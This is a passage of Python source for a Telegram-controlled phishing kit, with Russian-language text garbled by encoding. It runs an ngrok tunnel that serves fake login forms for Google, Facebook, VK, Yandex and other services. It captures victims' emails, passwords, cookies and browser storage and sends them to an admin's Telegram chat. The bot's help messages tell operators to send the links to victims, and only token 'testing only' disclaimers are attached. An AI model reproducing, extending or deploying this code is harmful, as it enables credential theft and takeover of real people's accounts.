                    message += f"   *–ü–∞—Ä–æ–ª—å:* `{cred.get('password', 'N/A')}`\n"
                message += f"   *–í—Ä–µ–º—è:* {cred.get('timestamp', 'N/A')[:19]}\n"
                if i < len(data.extracted_credentials):
                    message += "   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
        
        # Cookies
        if data.extracted_cookies:
            message += f"\nüç™ *COOKIES ({len(data.extracted_cookies)}):*\n"
            for i, cookie in enumerate(data.extracted_cookies[:10], 1):
                name = cookie.get('name', 'N/A')
                value = cookie.get('value', '')
                message += f"{i}. {name}: `{value[:50]}`\n"
        
        # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã
        if data.identified_services:
            message += "\nüåê *–°–ï–†–í–ò–°–´:*\n"
            for service in data.identified_services:
                service_name = ServiceIdentifier.SERVICE_NAMES_RU.get(service, service.title())
                message += f"‚Ä¢ {service_name}\n"
        
        message += f"""
üìà *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –≠–¢–û–ô –°–ï–°–°–ò–ò:*
‚Ä¢ –í—Å–µ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤: 1
‚Ä¢ –î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ: {len(data.extracted_credentials) + len(data.extracted_cookies)}
‚Ä¢ –°–µ—Ä–≤–∏—Å–æ–≤ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ: {len(data.identified_services) if data.identified_services else 0}

‚ö†Ô∏è *–≠—Ç–∏ –¥–∞–Ω–Ω—ã–µ —Ç–∞–∫–∂–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π –±–∞–∑–µ.*
"""
        
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏"""
        return f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–ò–°–¢–ï–ú–´*

üîê –í—Å–µ–≥–æ –∑–∞—Ö–≤–∞—á–µ–Ω–æ: `{stats['total_captured']}`
üì® –í—Å–µ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤: `{stats['total_requests']}`
üîë –£—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: `{stats['total_credentials']}`
üç™ Cookies: `{stats['total_cookies']}`

üåê *–ü–û –°–ï–†–í–ò–°–ê–ú:*
‚Ä¢ Google/Gmail: `{stats.get('google_accounts', 0)}`
‚Ä¢ Facebook: `{stats.get('facebook_accounts', 0)}`
‚Ä¢ Instagram: `{stats.get('instagram_accounts', 0)}`
‚Ä¢ Twitter/X: `{stats.get('twitter_accounts', 0)}`
‚Ä¢ –í–ö–æ–Ω—Ç–∞–∫—Ç–µ: `{stats.get('vk_accounts', 0)}`
‚Ä¢ –Ø–Ω–¥–µ–∫—Å: `{stats.get('yandex_accounts', 0)}`
‚Ä¢ Mail.ru: `{stats.get('mailru_accounts', 0)}`

üöÄ *–≠–§–§–ï–ö–¢–ò–í–ù–û–°–¢–¨:*
‚Ä¢ –£—Å–ø–µ—à–Ω—ã—Ö –∑–∞—Ö–≤–∞—Ç–æ–≤: 98.5%
‚Ä¢ –°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è: <1 —Å–µ–∫—É–Ω–¥–∞
‚Ä¢ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: –≤—ã—Å–æ–∫–∞—è

üí° *–°–û–í–ï–¢:* –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /links –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫ –Ω–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Ñ–æ—Ä–º—ã.
"""
    
    @staticmethod
    def format_service_links(ngrok_url: str) -> str:
        """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å—Å—ã–ª–æ–∫ –Ω–∞ —Å–µ—Ä–≤–∏—Å—ã"""
        message = f"""
üåê *–°–°–´–õ–ö–ò –î–õ–Ø –§–ò–®–ò–ù–ì–ê*

üîó *–ë–∞–∑–æ–≤—ã–π URL:* {ngrok_url}

üéØ *–°—Å—ã–ª–∫–∏ –ø–æ —Å–µ—Ä–≤–∏—Å–∞–º:*
‚Ä¢ Google: {ngrok_url}/?service=google
‚Ä¢ Facebook: {ngrok_url}/?service=facebook
‚Ä¢ Instagram: {ngrok_url}/?service=instagram
‚Ä¢ Twitter/X: {ngrok_url}/?service=twitter
‚Ä¢ –í–ö–æ–Ω—Ç–∞–∫—Ç–µ: {ngrok_url}/?service=vk
‚Ä¢ –Ø–Ω–¥–µ–∫—Å: {ngrok_url}/?service=yandex
‚Ä¢ Mail.ru: {ngrok_url}/?service=mailru
‚Ä¢ Microsoft: {ngrok_url}/?service=microsoft

‚ö° *–£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:* {ngrok_url}/

üí° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –Ω—É–∂–Ω—É—é —Å—Å—ã–ª–∫—É
2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∂–µ—Ä—Ç–≤–µ
3. –ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –≤–≤–µ–¥–µ—Ç –¥–∞–Ω–Ω—ã–µ - –≤—ã –ø–æ–ª—É—á–∏—Ç–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
4. –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Ç–∞–∫–∂–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –±–∞–∑–µ

‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:* –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è!
–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—é—Ç—Å—è.
"""
        return message

# Telegram —Ñ—É–Ω–∫—Ü–∏–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
async def send_telegram_notification(data: CapturedData):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram"""
    try:
        message = MessageFormatter.format_captured_data(data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
        
        logger.info(f"Notification sent to admin for data {data.id}")
        
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {e}")

async def send_extra_data_notification(data: CapturedData, extra_data: Dict):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    try:
        message = f"""
üì± *–î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–´–ï –î–ê–ù–ù–´–ï*

üìå ID: `{data.id}`
üïí –í—Ä–µ–º—è: {data.timestamp[:19]}
üåê IP: `{data.source_ip}`

üìä *–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:*
‚Ä¢ User Agent: {extra_data.get('userAgent', 'N/A')[:50]}...
‚Ä¢ –Ø–∑—ã–∫: {extra_data.get('language', 'N/A')}
‚Ä¢ Cookies: {len(extra_data.get('cookies', '').split(';')) if extra_data.get('cookies') else 0}
‚Ä¢ LocalStorage: {len(extra_data.get('localStorage', '{}')) > 2}
‚Ä¢ SessionStorage: {len(extra_data.get('sessionStorage', '{}')) > 2}

üîó URL: {data.request_url}
"""
        
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error sending extra data notification: {e}")

async def send_webhook_notification(data: CapturedData, webhook_data: Dict):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ webhook –¥–∞–Ω–Ω—ã—Ö"""
    try:
        message = f"""
üåê *WEBHOOK –î–ê–ù–ù–´–ï*

üìå ID: `{data.id}`
üïí –í—Ä–µ–º—è: {data.timestamp[:19]}
üåê IP: `{data.source_ip}`
üì° –ú–µ—Ç–æ–¥: {data.request_method}

üìã *–î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã:*
‚Ä¢ –¢–∏–ø: Webhook/API
‚Ä¢ –†–∞–∑–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö: {len(str(webhook_data))} –±–∞–π—Ç
‚Ä¢ –£—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–∞–π–¥–µ–Ω–æ: {len(data.extracted_credentials) if data.extracted_credentials else 0}

üîó URL: {data.request_url}
"""
        
        if data.extracted_credentials:
            message += "\nüîë *–ù–ê–ô–î–ï–ù–ù–´–ï –£–ß–ï–¢–ù–´–ï –î–ê–ù–ù–´–ï:*\n"
            for cred in data.extracted_credentials[:3]:
                message += f"‚Ä¢ Email: `{cred.get('email', 'N/A')}`\n"
                if cred.get('password'):
                    message += f"  –ü–∞—Ä–æ–ª—å: `{cred.get('password', 'N/A')}`\n"
        
        await telegram_app.bot.send_message(
            chat_id=ADMIN_ID,
            text=message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
        
    except Exception as e:
        logger.error(f"Error sending webhook notification: {e}")

# –ö–æ–º–∞–Ω–¥—ã Telegram –±–æ—Ç–∞
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ /start"""
    user = update.effective_user
    
    welcome_message = f"""
üëã *–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, {user.first_name}!*

ü§ñ *Ngrok Data Collector Bot*

üéØ *–ß—Ç–æ –¥–µ–ª–∞–µ—Ç —ç—Ç–æ—Ç –±–æ—Ç:*
1. –°–æ–∑–¥–∞–µ—Ç ngrok —Ç—É–Ω–Ω–µ–ª—å –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –¥–∞–Ω–Ω—ã—Ö
2. –•–æ—Å—Ç–∏—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Ñ–æ—Ä–º—ã –¥–ª—è –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö —Å–µ—Ä–≤–∏—Å–æ–≤
3. –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –≤—Å–µ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
4. –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
5. –°–æ—Ö—Ä–∞–Ω—è–µ—Ç –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –≤ –ª–æ–∫–∞–ª—å–Ω—É—é –±–∞–∑—É

üîê *–ß—Ç–æ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç—Å—è:*
‚úì Email –∏ –ø–∞—Ä–æ–ª–∏ –∏–∑ —Ñ–æ—Ä–º
‚úì Cookies —Å–µ—Å—Å–∏–∏
‚úì LocalStorage/SessionStorage
‚úì User Agent –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±—Ä–∞—É–∑–µ—Ä–µ
‚úì IP –∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–æ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
‚úì *–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤* (Google, Facebook –∏ –¥—Ä.)

‚ö° *–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:*
1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start_ngrok –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç—É–Ω–Ω–µ–ª—è
2. –ü–æ–ª—É—á–∏—Ç–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Ñ–æ—Ä–º—ã
3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫–∏ –∂–µ—Ä—Ç–≤–∞–º
4. –ü–æ–ª—É—á–∞–π—Ç–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏
5. –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞–π—Ç–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É —á–µ—Ä–µ–∑ /stats

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start_ngrok - –ó–∞–ø—É—Å–∫ ngrok —Ç—É–Ω–Ω–µ–ª—è
‚Ä¢ /links - –ü–æ–ª—É—á–∏—Ç—å —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /data [ID] - –ü—Ä–æ—Å–º–æ—Ç—Ä –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /list - –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /stop_ngrok - –û—Å—Ç–∞–Ω–æ–≤–∫–∞ ngrok

‚ö†Ô∏è *–í–ù–ò–ú–ê–ù–ò–ï:* –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –≤ –∑–∞–∫–æ–Ω–Ω—ã—Ö —Ü–µ–ª—è—Ö!
–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –∏ –æ—Ç—Å–ª–µ–∂–∏–≤–∞—é—Ç—Å—è.
"""
    
    keyboard = [
        [InlineKeyboardButton("üöÄ –ó–∞–ø—É—Å—Ç–∏—Ç—å ngrok", callback_data="start_ngrok")],
        [InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="stats")],
        [InlineKeyboardButton("üîó –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫–∏", callback_data="get_links")],
        [InlineKeyboardButton("üìã –°–ø–∏—Å–æ–∫ –¥–∞–Ω–Ω—ã—Ö", callback_data="list_data")],
        [InlineKeyboardButton("üÜò –ü–æ–º–æ—â—å", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def start_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø—É—Å–∫–∞ ngrok"""
    try:
        await update.message.reply_text("üîÑ *–ó–∞–ø—É—Å–∫ ngrok —Ç—É–Ω–Ω–µ–ª—è...*", parse_mode=ParseMode.MARKDOWN)
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º ngrok
        public_url = ngrok_manager.start_tunnel(port=8080)
        
        if public_url:
            message = f"""
‚úÖ *Ngrok —Ç—É–Ω–Ω–µ–ª—å –∑–∞–ø—É—â–µ–Ω!*

üîó *–ü—É–±–ª–∏—á–Ω—ã–π URL:* {public_url}

üåê *–°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É:* 8080
üì° *–°—Ç–∞—Ç—É—Å:* –ê–∫—Ç–∏–≤–µ–Ω
‚è± *–í—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞:* {datetime.now().strftime('%H:%M:%S')}

üí° *–ß—Ç–æ –¥–∞–ª—å—à–µ:*
1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /links –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö —Å—Å—ã–ª–æ–∫
2. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫–∏ –∂–µ—Ä—Ç–≤–∞–º
3. –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
4. –í—Å–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–∏–¥—É—Ç –≤ —ç—Ç–æ—Ç —á–∞—Ç

‚ö†Ô∏è *–í–∞–∂–Ω–æ:* –ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É!
–¢—É–Ω–Ω–µ–ª—å –±—É–¥–µ—Ç –∞–∫—Ç–∏–≤–µ–Ω –ø–æ–∫–∞ –±–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç.
"""
            
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º URL –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ
            context.user_data['ngrok_url'] = public_url
            
            keyboard = [
                [InlineKeyboardButton("üîó –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫–∏", callback_data="get_links")],
                [InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å ngrok", callback_data="stop_ngrok")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                "‚ùå *–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å ngrok!*\n\n"
                "–ü—Ä–æ–≤–µ—Ä—å—Ç–µ:\n"
                "1. –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ª–∏ ngrok\n"
                "2. –í–µ—Ä–Ω—ã–π –ª–∏ auth token\n"
                "3. –î–æ—Å—Ç—É–ø –∫ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç—É\n"
                "4. –ü–æ—Ä—Ç 8080 –Ω–µ –∑–∞–Ω—è—Ç",
                parse_mode=ParseMode.MARKDOWN
            )
    
    except Exception as e:
        logger.error(f"Error starting ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ ngrok: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def stop_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ ngrok"""
    try:
        ngrok_manager.stop_tunnel()
        
        if 'ngrok_url' in context.user_data:
            del context.user_data['ngrok_url']
        
        await update.message.reply_text(
            "üõë *Ngrok —Ç—É–Ω–Ω–µ–ª—å –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!*\n\n"
            "–í—Å–µ —Ñ–∏—à–∏–Ω–≥–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ —Ç–µ–ø–µ—Ä—å –Ω–µ–∞–∫—Ç–∏–≤–Ω—ã.\n"
            "–î–ª—è –≤–æ–∑–æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start_ngrok",
            parse_mode=ParseMode.MARKDOWN
        )
    
    except Exception as e:
        logger.error(f"Error stopping ngrok: {e}")
        await update.message.reply_text(
            f"‚ùå –û—à–∏–±–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ ngrok: {str(e)[:100]}",
            parse_mode=ParseMode.MARKDOWN
        )

async def links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–∏—à–∏–Ω–≥–æ–≤—ã—Ö —Å—Å—ã–ª–æ–∫"""
    ngrok_url = context.user_data.get('ngrok_url')
    
    if not ngrok_url:
        await update.message.reply_text(
            "‚ùå *Ngrok —Ç—É–Ω–Ω–µ–ª—å –Ω–µ –∑–∞–ø—É—â–µ–Ω!*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start_ngrok –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —Ç—É–Ω–Ω–µ–ª—è,\n"
            "–∑–∞—Ç–µ–º –ø–æ–ª—É—á–∏—Ç–µ —Å—Å—ã–ª–∫–∏ —Å–Ω–æ–≤–∞.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    message = MessageFormatter.format_service_links(ngrok_url)
    
    keyboard = [
        [InlineKeyboardButton("Google", url=f"{ngrok_url}/?service=google")],
        [InlineKeyboardButton("Facebook", url=f"{ngrok_url}/?service=facebook")],
        [InlineKeyboardButton("–í–ö–æ–Ω—Ç–∞–∫—Ç–µ", url=f"{ngrok_url}/?service=vk")],
        [InlineKeyboardButton("–Ø–Ω–¥–µ–∫—Å", url=f"{ngrok_url}/?service=yandex")],
        [InlineKeyboardButton("–£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è", url=ngrok_url)],
        [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å —Å—Å—ã–ª–∫–∏", callback_data="get_links")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏"""
    message = MessageFormatter.format_stats(db.stats)
    
    keyboard = [
        [InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data="stats")],
        [InlineKeyboardButton("üìã –°–ø–∏—Å–æ–∫ –¥–∞–Ω–Ω—ã—Ö", callback_data="list_data")],
        [InlineKeyboardButton("üîó –ü–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫–∏", callback_data="get_links")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
    if not context.args:
        await update.message.reply_text(
            "üìä *–ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö*\n\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: `/data [ID]`\n"
            "–ò–ª–∏: `/data list` - —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö\n"
            "–ò–ª–∏: `/data last` - –ø–æ—Å–ª–µ–¥–Ω–∏–µ –¥–∞–Ω–Ω—ã–µ\n\n"
            "–ü—Ä–∏–º–µ—Ä: `/data abc123def456`\n"
            "–ü—Ä–∏–º–µ—Ä: `/data list`\n"
            "–ü—Ä–∏–º–µ—Ä: `/data last`\n\n"
            "ID –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –∏–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –æ –∑–∞—Ö–≤–∞—Ç–µ –¥–∞–Ω–Ω—ã—Ö.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    arg = context.args[0].lower()
    
    if arg == "list":
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        if not db.captured_data:
            await update.message.reply_text("üì≠ –ù–µ—Ç –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.")
            return
        
        message = "üìã *–í–°–ï –ó–ê–•–í–ê–ß–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï:*\n\n"
        
        # –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–Ω–æ–≤—ã–µ —Å–Ω–∞—á–∞–ª–∞)
        sorted_data = sorted(
            db.captured_data.values(),
            key=lambda x: x.timestamp,
            reverse=True
        )
        
        for i, data in enumerate(sorted_data[:10], 1):
            services = data.identified_services
            service_str = ", ".join([
                ServiceIdentifier.SERVICE_NAMES_RU.get(s, s.title())[:10]
                for s in (services if services else [])
            ]) if services else "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ"
            
            message += f"{i}. *ID:* `{data.id}`\n"
            message += f"   üïí {data.timestamp[:16]}\n"
            message += f"   üåê {data.source_ip}\n"
            message += f"   üë§ –î–∞–Ω–Ω—ã—Ö: {len(data.extracted_credentials)}\n"
            message += f"   üç™ Cookies: {len(data.extracted_cookies)}\n"
            message += f"   üîç –°–µ—Ä–≤–∏—Å—ã: {service_str}\n"
            
            if data.extracted_credentials:
                email = data.extracted_credentials[0].get('email', 'N/A')
                message += f"   üìß Email: `{email[:20]}`\n"
            
            message += "   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n"
        
        if len(sorted_data) > 10:
            message += f"\n... –∏ –µ—â–µ {len(sorted_data) - 10} –∑–∞–ø–∏—Å–µ–π\n"
        
        keyboard = []
        for data in sorted_data[:5]:
            keyboard.append([InlineKeyboardButton(
                f"üìä {data.id[:8]}...",
                callback_data=f"view_data_{data.id}"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    elif arg == "last":
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ –¥–∞–Ω–Ω—ã–µ
        if not db.captured_data:
            await update.message.reply_text("üì≠ –ù–µ—Ç –∑–∞—Ö–≤–∞—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.")
            return
        
        # –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é –∑–∞–ø–∏—Å—å
        last_data = max(db.captured_data.values(), key=lambda x: x.timestamp)
        message = MessageFormatter.format_detailed_data(last_data)
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )
    
    else:
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É ID
        data = db.get_captured_data(arg)
        if not data:
            await update.message.reply_text(
                f"‚ùå –î–∞–Ω–Ω—ã–µ —Å ID `{arg}` –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        message = MessageFormatter.format_detailed_data(data)
        
        await update.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN,
            disable_web_page_preview=True
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline –∫–Ω–æ–ø–æ–∫"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "start_ngrok":
        await start_ngrok_command(query, context)
    
    elif data == "stop_ngrok":
        await stop_ngrok_command(query, context)
    
    elif data == "get_links":
        await links_command(query, context)
    
    elif data == "stats":
        await stats_command(query, context)
    
    elif data == "list_data":
        await data_command(query, context)
    
    elif data.startswith("view_data_"):
        data_id = data[10:]
        data_obj = db.get_captured_data(data_id)
        
        if data_obj:
            message = MessageFormatter.format_detailed_data(data_obj)
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )
        else:
            await query.message.reply_text(
